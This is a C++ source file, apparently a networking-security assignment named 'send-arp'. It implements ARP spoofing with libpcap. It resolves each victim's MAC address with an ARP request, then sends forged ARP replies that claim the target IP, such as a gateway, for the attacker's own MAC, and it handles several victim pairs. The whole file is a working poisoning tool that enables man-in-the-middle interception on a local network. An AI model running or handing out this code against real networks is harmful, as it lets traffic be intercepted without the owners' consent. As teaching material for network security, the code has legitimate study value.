#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <ifaddrs.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <vector>
#include <unordered_map>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct IpPair {
    Ip sender;
    Ip target;
    Mac sender_mac;
};

void usage() {
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool get_interface_info(const char* interface, Mac& mac, Ip& ip) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    
    // Get MAC address
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) != 0) return false;
    mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);

    // Get IP address
    if (ioctl(fd, SIOCGIFADDR, &ifr) != 0) return false;
    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    ip = Ip(inet_ntoa(ipaddr->sin_addr));

	// printf("%s: %s, %s\n", interface, std::string(mac).c_str(), std::string(ip).c_str());
    close(fd);
    return true;
}

int send_arp(pcap_t* handle, Mac my_mac, Ip target_ip, Mac sender_mac, Ip sender_ip) {

    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    return res;
}

Mac get_sender_mac(pcap_t* handle, Mac my_mac, Ip my_ip, Ip sender_ip) {

    // printf("1\n");
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return Mac::nullMac();
    }

    while (true) {
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            return Mac::nullMac();
        }
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* recv_packet = (EthArpPacket*)packet;
        if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp &&
            ntohs(recv_packet->arp_.op_) == ArpHdr::Reply &&
            Ip(recv_packet->arp_.sip()) == sender_ip) {
                return recv_packet->arp_.smac_;
        }
    }

    return Mac::nullMac();
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac my_mac;
    Ip my_ip;
    if (!get_interface_info(dev, my_mac, my_ip)) {
        fprintf(stderr, "couldn't get interface info for %s\n", dev);
        return -1;
    }

    std::vector<IpPair> ip_pairs;
    std::unordered_map<Ip, Mac> known_macs;

    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i+1]);
        
        Mac sender_mac;
        if (known_macs.find(sender_ip) == known_macs.end()) {
            sender_mac = get_sender_mac(handle, my_mac, my_ip, sender_ip);
            if (sender_mac == Mac::nullMac()) {
                fprintf(stderr, "couldn't get sender's MAC address for %s\n", std::string(sender_ip).c_str());
                continue;
            }
            known_macs[sender_ip] = sender_mac;
        } else {
            sender_mac = known_macs[sender_ip];
        }
        // printf("%d %s\n",i, std::string(sender_mac).c_str());
        // printf("%s\n",std::string(target_ip).c_str());
        ip_pairs.push_back({sender_ip, target_ip, sender_mac});
        send_arp(handle, my_mac, target_ip, sender_mac, sender_ip);
    }

    if (ip_pairs.empty()) {
        fprintf(stderr, "No valid IP pairs provided. Exiting.\n");
        return -1;
    }

    // for (int i = 2; i < argc; i += 2) {
    //     ip_pairs.push_back({Ip(argv[i]), Ip(argv[i+1]), Mac::nullMac()});
    // }

    // if (ip_pairs.empty()) {
    //     fprintf(stderr, "No IP pairs provided. Exiting.\n");
    //     return -1;
    // }

    // for (auto& pair : ip_pairs) {
    //     pair.sender_mac = get_sender_mac(handle, my_mac, my_ip, pair.sender);
    //     printf("%s\n",::std::string(pair.sender_mac).c_str());
    //     if (pair.sender_mac == Mac::nullMac()) {
    //         fprintf(stderr, "couldn't get sender's MAC address for %s\n", std::string(pair.sender).c_str());
    //         continue;
    //     }
    //     send_arp(handle, my_mac, pair.target, pair.sender_mac, pair.sender);
    // }

    // Ip sender_ip = Ip(argv[2]);
    // Ip target_ip = Ip(argv[3]);

    // Mac sender_mac = get_sender_mac(handle, my_mac, my_ip, sender_ip);
    // printf("%s",::std::string(sender_mac).c_str());
    // if (sender_mac == Mac::nullMac()) {
    //     fprintf(stderr, "couldn't get sender's MAC address\n");
    //     return -1;
    // }

    // int res = send_arp(handle, my_mac, target_ip, sender_mac, sender_ip);

    // EthArpPacket packet;

    // packet.eth_.dmac_ = sender_mac;
    // packet.eth_.smac_ = my_mac;
    // packet.eth_.type_ = htons(EthHdr::Arp);

    // packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    // packet.arp_.pro_ = htons(EthHdr::Ip4);
    // packet.arp_.hln_ = Mac::SIZE;
    // packet.arp_.pln_ = Ip::SIZE;
    // packet.arp_.op_ = htons(ArpHdr::Reply);
    // packet.arp_.smac_ = my_mac;
    // packet.arp_.sip_ = htonl(target_ip);
    // packet.arp_.tmac_ = sender_mac;
    // packet.arp_.tip_ = htonl(sender_ip);

    // int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    // if (res != 0) {
    //     fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    // }

    pcap_close(handle);
}